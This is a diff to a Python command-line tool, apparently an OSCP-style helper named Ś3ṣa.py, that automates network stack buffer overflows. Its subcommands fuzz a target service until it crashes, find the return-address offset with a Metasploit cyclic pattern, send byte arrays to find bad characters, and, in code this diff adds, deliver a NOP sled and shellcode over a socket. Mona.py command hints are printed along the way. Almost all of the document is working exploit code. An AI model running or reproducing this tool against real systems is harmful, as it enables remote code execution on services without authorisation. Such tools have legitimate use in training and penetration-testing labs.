@@ -4,9 +4,10 @@
 # https://en.wikipedia.org/wiki/Shesha
 
 import argparse
-import subprocess
 import socket
-import time
+from collections import namedtuple
+from subprocess import run
+from time import sleep
 
 def get_banner():
     return (
@@ -18,8 +19,8 @@ def get_banner():
 "#      \__/.----/  ^  \----.\__/     |___/\___/ |___/\__,_|.py #\n"
 "# (x10k)^ /   ,   \ /   ,   \ ^                    °           #\n"
 "#        /  /`\   / \   /'\, \                                 #\n" 
-"#   ___  `\ \  \-  |  -/  /`/'       network buffer-overflow   #\n"
-"#  /   \  |`\\\\_)`-- --'(_//           fuzz & exploit assist    #\n"
+"#   ___  `\ \  \-  |  -/  /`/'          network stack-bof      #\n"
+"#  /   \  |`\\\\_)`-- --'(_//              fuzz & exploit        #\n"
 "# |0| |0\ / | |_|`-- --'|_| _______                            #\n"
 "#  \__/\____/,'`-   -'`.,-'/       `-.                         #\n"
 "#            \---------/||            `-.      _,------.       #\n"
@@ -36,17 +37,18 @@ def filler_type(value):
 
 
 def hexchars_type(value_str):
-    value = []
+    Hexchars = namedtuple('Hexchars', ['raw', 'str'], defaults=[[], ''])
+    value = Hexchars(str=value_str)
+    
     chunk_size = 4
     chunks = [value_str[i:i+chunk_size] for i in range(0, len(value_str), chunk_size)]
-    
     for x in chunks:
         if len(x) != 4 or x[:2] != '\\x':
             raise argparse.ArgumentTypeError('%s is not a valid list of hex chars, choose values with format \\x00' % value_str)
 
         value_int = int(x[2:], 16)
         value_chr = chr(value_int)
-        value.append(value_chr)
+        value.raw.append(value_chr)
 
     return value
 
@@ -69,36 +71,46 @@ def parse_args():
 
 
 def add_global_parser(parser):
+    parser.add_argument('-d', '--debug', help='print debug output', action='store_true', default=False)
     parser.add_argument('-t', '--timeout', help='connection timeout - in seconds', type=int, default=5)
-    parser.add_argument('-d', '--delay', help='wait time between reply and next message - in seconds', type=int, default=1)
-    parser.add_argument('-I', '--interactions', help='network messages sent previous to the payload', nargs='+', metavar='MSG', default=[])
-    parser.add_argument('-p', '--prefix', help='prefix needed to trigger payload')
+    parser.add_argument('-p', '--prefix', help='prefix needed to trigger payload', default='')
     parser.add_argument('-f', '--filler', help='char repeated to fill the buffer', type=filler_type, default='A')
+    parser.add_argument('-l', '--headless', help='expect no banner from target', action='store_true', default=False)
+
+
+def add_test_subparser(subparsers):
+    fuzz_parser = subparsers.add_parser('test-connect', aliases=['test'], help='test connection to target')
+    fuzz_parser.set_defaults(func=test_connect)
 
 
 def add_fuzz_subparser(subparsers):
     fuzz_parser = subparsers.add_parser('find-length', aliases=['fuzz'], help='for more options: fuzz -h', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
-    fuzz_parser.add_argument('-s', '--step', help='increase in buffer length per iteration', type=int, default=100)
+    fuzz_parser.add_argument('-w', '--wait', help='wait time between iterations - in seconds', type=int, default=1)
+    fuzz_parser.add_argument('-i', '--increase', help='increase in buffer length per iteration', type=int, default=100)
     fuzz_parser.set_defaults(func=fuzz)
 
 
 def add_offset_subparser(subparsers):
-    offset_parser = subparsers.add_parser('find-offset', aliases=['eip'], help='for more options: eip -h', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
-    offset_parser.add_argument('-a', '--approx', help='approx buffer length that causes overflow - found using MODE=fuzz', type=int, required=True)
-    offset_parser.add_argument('-c', '--cyclic', help='length of cyclic pattern used', type=int, default=100)
+    offset_parser = subparsers.add_parser('find-offset', aliases=['offset'], help='for more options: offset -h', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+    offset_parser.add_argument('-o', '--offset', help='approx buffer length that causes overflow - found using MODE=fuzz', type=int, required=True)
+    offset_parser.add_argument('-c', '--cyclic', help='length of cyclic pattern used', type=int, default=128)
     offset_parser.set_defaults(func=find_offset)
 
 
 def add_badchars_subparser(subparsers):
-    badchars_parser = subparsers.add_parser('find-badchars', aliases=['bad'], help='for more options: bad -h', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
-    badchars_parser.add_argument('-o', '--offset', help='EIP offset - found using MODE=eip', type=int, required=True)
-    badchars_parser.add_argument('-e', '--eip', help='char repeated to fill the EIP reg', type=filler_type, default='B')
-    badchars_parser.add_argument('-b', '--badchars', help='Known badchars in hex (\\x00) string', type=hexchars_type, default=[])
+    badchars_parser = subparsers.add_parser('find-badchars', aliases=['bad'], help='for more options: badchars -h', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+    badchars_parser.add_argument('-o', '--offset', help='return address offset - found using MODE=offset', type=int, required=True)
+    badchars_parser.add_argument('-r', '--retaddress', help='char repeated to fill the return address', type=filler_type, default='B')
+    badchars_parser.add_argument('-b', '--badchars', help='Known badchars in hex (\\x00) string', type=hexchars_type)
     badchars_parser.set_defaults(func=find_badchars)
 
 
 def add_exploit_subparser(subparsers):
-    exploit_parser = subparsers.add_parser('exploit', aliases=['pwn'], help='for more options: pwn -h', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+    exploit_parser = subparsers.add_parser('send-exploit', aliases=['pwn'], help='for more options: pwn -h', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+    exploit_parser.add_argument('-o', '--offset', help='return address offset - found using MODE=offset', type=int, required=True)
+    exploit_parser.add_argument('-r', '--retaddress', help='Return address that will overwrite EIP -bigendian)', type=hexchars_type, required=True)
+    exploit_parser.add_argument('-n', '--nopsled', help='Length of the NOP-sled', type=int, default=16)
+    exploit_parser.add_argument('-s', '--shellcode', help='File containing the shellcode', type=argparse.FileType('rb'), required=True)
     exploit_parser.set_defaults(func=exploit)
 
 
@@ -107,25 +119,30 @@ def fuzz(args):
     buffer = ''
     try:
         while True:
-            overflow += args.filler * args.step
+            overflow += args.filler * args.increase
             buffer = args.prefix + overflow
-            print('Fuzzing with {} bytes (total {})'.format(len(overflow), len(buffer)))
+            print('[-][f] Fuzzing with {} bytes (total {})'.format(len(overflow), len(buffer)))
 
             send(buffer, blocking=True)
-            time.sleep(args.delay)
-    except:
-        print('[*] Fuzzing crashed at {} bytes (total {})'.format(len(overflow), len(buffer)))
+            sleep(args.wait)
+    except Exception as ex:
+        if args.debug:
+            print(type(ex))
+            print(repr(ex))
+        print('[-][f] Fuzzing crashed at {} bytes (total {})'.format(len(overflow), len(buffer)))
+        print('[*][f] To find the offset: Ś3ṣa.py offset -o {} {} {} ...)'.format(len(overflow) - args.increase, args.target, args.port))
 
 
 def find_offset(args):
-    overflow_len = args.approx - args.cyclic
-    overflow = args.filler * overflow_len
-    pattern = subprocess.run(['msf-pattern_create', '-l', str(args.cyclic)], capture_output=True, text=True).stdout
+    overflow = args.filler * args.offset
+    pattern = run(['msf-pattern_create', '-l', str(args.cyclic)], capture_output=True, text=True).stdout
     
     buffer = args.prefix + overflow + pattern
     send(buffer)
-    print('[*] Payload sent, look for pattern offset with mona.py: !mona findmsp -distance {}'.format(args.cyclic))
-    print('[*] EIP = {} + mona_offset'.format(overflow_len))
+    print('[*][o] Payload sent, look for offset using mona.py')
+    print('[*][o] Init a working dir: !mona config -set workingfolder c:\mona\%p')
+    print('[*][o] Find the offset: !mona findmsp -distance {}'.format(args.cyclic))
+    print('[*][o] EIP = {} + mona_offset'.format(args.offset))
 
 
 def find_badchars(args):
@@ -148,18 +165,33 @@ def find_badchars(args):
 "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
 
     overflow = args.filler * args.offset
-    ret_address = args.eip * 4
-    badchars = "".join([x for x in allchars if x not in args.badchars])
+    ret_address = args.retaddress * 4
+    badchars = ''.join([x for x in allchars if x not in args.badchars.raw])
 
     buffer = args.prefix + overflow + ret_address + badchars
     send(buffer)
-    print('[*] Badchars sent, now compare them with mona.py')
-    print('[*] Create bytearray: !mona bytearray -b "<badchars>"')
-    print('[*] Compare it with memory: !mona compare -f <path>\\bytearray.bin -a <ESP>')
+    print('[*][b] Payload sent, look for badchars using mona.py')
+    print('[*][b] Create bytearray: !mona bytearray -b "{}"'.format(args.badchars.str))
+    print('[*][b] Compare stack: !mona compare -f <path>\\bytearray.bin -a <ESP>')
+    print('[*][b] Take note of non-consecutive badchars, rinse and repeat')
+    print()
+    print('[*][b] Once you catch them all, find a return address')
+    print('[*][b] Find a usable jmp to stack: !mona jmp -r esp -cpb "{}"'.format(args.badchars.str))
 
 
 def exploit(args):
-    return
+    overflow = args.filler * args.offset
+    retaddress = ''.join(args.retaddress.raw[::-1])
+    nopsled = '\x90' * args.nopsled
+    
+    shellcode_bin = b''
+    with args.shellcode as file:
+        shellcode_bin = file.read()
+    shellcode = ''.join(map(chr, shellcode_bin))
+    
+    buffer = args.prefix + overflow + retaddress + nopsled + shellcode
+    send(buffer)
+    print('[*][e] Payload sent, good luck!')
 
 
 def send(buffer, blocking=False):
@@ -174,21 +206,19 @@ def send(buffer, blocking=False):
 def connect(s, args):
     s.settimeout(args.timeout)
     s.connect((args.target, args.port))
-    s.recv(1024)
+
+    if not args.headless:
+        s.recv(1024)
 
 
 def test_connect(args):
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: 
             connect(s, args)
-            return True
     except:
-        return False
+        print('[!] Could not connect to the target ({}:{})'.format(args.target, args.port))
+        exit(1)
 
 
 args = parse_args()
-if not test_connect(args):
-    print('[!] Could not connect to the target ({}:{})'.format(args.target, args.port))
-    exit(1)
-else:
-    args.func(args)
+args.func(args)
